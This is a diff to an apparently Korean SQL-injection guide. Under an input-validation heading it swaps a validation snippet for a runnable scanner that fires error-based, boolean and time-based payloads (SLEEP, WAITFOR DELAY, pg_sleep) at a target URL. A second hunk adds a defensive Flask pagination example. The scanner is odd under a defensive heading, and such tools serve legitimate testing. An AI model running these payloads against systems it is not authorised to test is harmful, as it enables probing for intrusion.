@@ -438,18 +438,240 @@ stmt.setString(1, userId);
 
 ### 입력 검증 및 화이트리스트
 ```python
+#!/usr/bin/env python3
+"""
+requests 기반 SQL Injection 자동 탐지기
+Boolean-based Blind, Error-based, Time-based 탐지 지원
+사용법: python3 sqli_detector.py -u "http://target.com/page?id=1"
+        python3 sqli_detector.py -u "http://target.com/login" --post "user=admin&pass=test"
+"""
+import argparse
 import re
+import time
+from dataclasses import dataclass, field
+from typing import Optional
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
-def validate_input(user_input):
-    # 숫자만 허용
-    if not re.match(r'^\d+$', user_input):
-        raise ValueError("숫자만 입력 가능")
-    return user_input
+import requests
+from requests import Response
 
-# 화이트리스트 (허용 목록)
-ALLOWED_COLUMNS = ['username', 'email', 'created_at']
-if column_name not in ALLOWED_COLUMNS:
-    raise ValueError("허용되지 않은 컬럼")
+
+# ── SQL 에러 패턴 (DB별) ───────────────────────────────────────────────────────
+SQL_ERROR_PATTERNS: dict[str, list[str]] = {
+    "MySQL":      [r"you have an error in your sql syntax",
+                   r"warning: mysql_", r"mysql_num_rows\(\)"],
+    "MSSQL":      [r"unclosed quotation mark", r"incorrect syntax near",
+                   r"microsoft ole db provider for sql server"],
+    "PostgreSQL": [r"pg_query\(\):", r"unterminated quoted string",
+                   r"postgresql.*error"],
+    "Oracle":     [r"ora-\d{5}:", r"oracle error", r"quoted string not properly terminated"],
+    "SQLite":     [r"sqlite.*error", r"no such column:", r"unrecognized token:"],
+}
+
+# ── Boolean-based 확인용 페이로드 쌍 ──────────────────────────────────────────
+BOOL_PAYLOADS: list[tuple[str, str]] = [
+    ("' AND '1'='1", "' AND '1'='2"),        # 따옴표 기반
+    (" AND 1=1--",   " AND 1=2--"),           # 정수 기반
+    ("') AND ('1'='1", "') AND ('1'='2"),     # 괄호 포함
+]
+
+# ── Time-based 페이로드 (DB별) ────────────────────────────────────────────────
+TIME_PAYLOADS: list[str] = [
+    "'; SELECT SLEEP(5)--",                  # MySQL
+    "'; WAITFOR DELAY '0:0:5'--",            # MSSQL
+    "'; SELECT pg_sleep(5)--",               # PostgreSQL
+    "' AND SLEEP(5)--",                      # MySQL (AND)
+    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", # PostgreSQL (AND)
+]
+
+
+@dataclass
+class ScanResult:
+    url: str
+    param: str
+    method: str
+    vuln_type: str
+    payload: str
+    evidence: str = ""
+    db_type: str = "Unknown"
+
+
+def make_request(
+    session: requests.Session,
+    url: str,
+    method: str,
+    params: dict,
+    timeout: float = 10,
+) -> Optional[Response]:
+    try:
+        if method.upper() == "GET":
+            resp = session.get(url, params=params, timeout=timeout)
+        else:
+            resp = session.post(url, data=params, timeout=timeout)
+        return resp
+    except requests.RequestException:
+        return None
+
+
+def detect_error_based(
+    session: requests.Session,
+    url: str,
+    method: str,
+    base_params: dict,
+    param: str,
+) -> Optional[ScanResult]:
+    """SQL 에러 메시지 기반 탐지"""
+    payloads = ["'", '"', "''", "1'", "1\""]
+    for payload in payloads:
+        params = {**base_params, param: base_params.get(param, "") + payload}
+        resp = make_request(session, url, method, params)
+        if resp is None:
+            continue
+        body = resp.text.lower()
+        for db_type, patterns in SQL_ERROR_PATTERNS.items():
+            for pattern in patterns:
+                if re.search(pattern, body, re.IGNORECASE):
+                    return ScanResult(
+                        url=url, param=param, method=method,
+                        vuln_type="Error-based",
+                        payload=payload,
+                        evidence=re.search(pattern, body, re.IGNORECASE).group()[:80],
+                        db_type=db_type,
+                    )
+    return None
+
+
+def detect_boolean_based(
+    session: requests.Session,
+    url: str,
+    method: str,
+    base_params: dict,
+    param: str,
+) -> Optional[ScanResult]:
+    """Boolean-based Blind 탐지"""
+    original_val = str(base_params.get(param, "1"))
+
+    for true_payload, false_payload in BOOL_PAYLOADS:
+        params_true  = {**base_params, param: original_val + true_payload}
+        params_false = {**base_params, param: original_val + false_payload}
+
+        resp_true  = make_request(session, url, method, params_true)
+        resp_false = make_request(session, url, method, params_false)
+
+        if resp_true is None or resp_false is None:
+            continue
+
+        # 응답 길이 차이 10% 이상이면 Boolean 반응 있음
+        len_true, len_false = len(resp_true.text), len(resp_false.text)
+        if len_true > 0 and abs(len_true - len_false) / len_true > 0.10:
+            return ScanResult(
+                url=url, param=param, method=method,
+                vuln_type="Boolean-based Blind",
+                payload=true_payload,
+                evidence=f"참({len_true}B) vs 거짓({len_false}B) 차이",
+            )
+    return None
+
+
+def detect_time_based(
+    session: requests.Session,
+    url: str,
+    method: str,
+    base_params: dict,
+    param: str,
+    threshold: float = 4.5,
+) -> Optional[ScanResult]:
+    """Time-based Blind 탐지"""
+    for payload in TIME_PAYLOADS:
+        params = {**base_params, param: str(base_params.get(param, "1")) + payload}
+        start = time.monotonic()
+        resp = make_request(session, url, method, params, timeout=15)
+        elapsed = time.monotonic() - start
+        if elapsed >= threshold:
+            db_hint = "MySQL" if "SLEEP" in payload else \
+                      "MSSQL" if "WAITFOR" in payload else "PostgreSQL"
+            return ScanResult(
+                url=url, param=param, method=method,
+                vuln_type="Time-based Blind",
+                payload=payload,
+                evidence=f"응답 {elapsed:.1f}초 지연",
+                db_type=db_hint,
+            )
+    return None
+
+
+def scan(
+    url: str,
+    post_data: Optional[str] = None,
+    cookies: Optional[str] = None,
+    headers: Optional[dict] = None,
+    delay: float = 0.3,
+) -> list[ScanResult]:
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi-Detector/2.0)"})
+    if headers:
+        session.headers.update(headers)
+    if cookies:
+        for item in cookies.split(";"):
+            k, _, v = item.strip().partition("=")
+            session.cookies.set(k.strip(), v.strip())
+
+    method = "POST" if post_data else "GET"
+    parsed = urlparse(url)
+
+    if method == "GET":
+        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
+    else:
+        params = dict(pair.split("=", 1) for pair in post_data.split("&") if "=" in pair)
+
+    if not params:
+        print(f"[-] 파라미터 없음: {url}")
+        return []
+
+    results: list[ScanResult] = []
+    for param in params:
+        print(f"[*] 파라미터 스캔: {param}")
+        for detect_fn in (detect_error_based, detect_boolean_based, detect_time_based):
+            result = detect_fn(session, url, method, params, param)
+            if result:
+                results.append(result)
+                print(f"  [!] {result.vuln_type} 발견! DB:{result.db_type}  "
+                      f"payload:{result.payload!r}  근거:{result.evidence}")
+                break  # 하나 발견하면 다음 파라미터로
+        time.sleep(delay)
+
+    return results
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="SQL Injection 자동 탐지기")
+    parser.add_argument("-u", "--url", required=True, help="대상 URL")
+    parser.add_argument("--post", help="POST 데이터 (예: user=admin&pass=1)")
+    parser.add_argument("--cookie", help="쿠키 문자열 (예: session=abc)")
+    parser.add_argument("--header", action="append", default=[],
+                        help="추가 헤더 (예: X-Token:abc), 여러 번 사용 가능")
+    parser.add_argument("--delay", type=float, default=0.3,
+                        help="요청 간 딜레이(초) (기본: 0.3)")
+    args = parser.parse_args()
+
+    extra_headers = {}
+    for h in args.header:
+        k, _, v = h.partition(":")
+        extra_headers[k.strip()] = v.strip()
+
+    print(f"[*] SQL Injection 스캔 시작: {args.url}")
+    results = scan(args.url, args.post, args.cookie, extra_headers, args.delay)
+
+    if results:
+        print(f"\n[+] 총 {len(results)}개 취약점 발견")
+        for r in results:
+            print(f"  - {r.param} ({r.vuln_type}, {r.db_type})")
+    else:
+        print("\n[-] 취약점 미발견 (수동 확인 권장)")
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### 최소 권한 원칙
@@ -581,18 +803,64 @@ template = Template("Hello " + user_input)  # SSTI 가능!
 ```
 
 ```python
-# 방어: 최대 반환 행 수 제한
-def get_users(page=1, per_page=20):
-    # 페이지당 최대 100개로 제한
-    per_page = min(per_page, 100)
-    offset = (page - 1) * per_page
-    
-    stmt = text("SELECT id, username FROM users LIMIT :limit OFFSET :offset")
-    return db.execute(stmt, {"limit": per_page, "offset": offset})
-
-# API 레이트 리미팅 (대량 추출 방지)
+#!/usr/bin/env python3
+"""
+SQLAlchemy + Flask 기반 안전한 페이지네이션 구현
+Prepared Statement + 최대 행 수 제한 + Rate Limiting
+"""
+from flask import Flask, request, jsonify, abort
 from flask_limiter import Limiter
-limiter = Limiter(app, default_limits=["100 per hour", "10 per minute"])
+from flask_limiter.util import get_remote_address
+from sqlalchemy import text, create_engine
+from sqlalchemy.orm import sessionmaker
+
+app = Flask(__name__)
+engine = create_engine("sqlite:///users.db")
+Session = sessionmaker(bind=engine)
+
+# Rate Limiter 설정 (IP 기반)
+limiter = Limiter(
+    key_func=get_remote_address,
+    app=app,
+    default_limits=["200 per hour", "20 per minute"],
+    storage_uri="memory://",
+)
+
+MAX_PER_PAGE = 100   # 페이지당 최대 행 수 (대량 추출 방지)
+ALLOWED_ORDER_COLS = {"id", "username", "created_at"}  # 화이트리스트
+
+
+@app.route("/api/users")
+@limiter.limit("30 per minute")  # 개별 엔드포인트 제한
+def list_users():
+    # 입력값 검증 (타입 강제 + 범위 제한)
+    try:
+        page     = max(1, int(request.args.get("page", 1)))
+        per_page = min(MAX_PER_PAGE, max(1, int(request.args.get("per_page", 20))))
+    except ValueError:
+        abort(400, "page/per_page는 정수여야 합니다")
+
+    order_by = request.args.get("order_by", "id")
+    if order_by not in ALLOWED_ORDER_COLS:
+        abort(400, f"order_by는 {ALLOWED_ORDER_COLS} 중 하나여야 합니다")
+
+    offset = (page - 1) * per_page
+
+    # Prepared Statement로 파라미터 바인딩 (SQL Injection 방어)
+    # order_by는 화이트리스트로 이미 검증됐으므로 직접 포매팅 허용
+    with Session() as session:
+        rows = session.execute(
+            text(f"SELECT id, username, email FROM users "
+                 f"ORDER BY {order_by} "
+                 f"LIMIT :limit OFFSET :offset"),
+            {"limit": per_page, "offset": offset},
+        ).fetchall()
+
+    return jsonify({
+        "page": page,
+        "per_page": per_page,
+        "data": [{"id": r.id, "username": r.username} for r in rows],
+    })
 ```
 
 ---
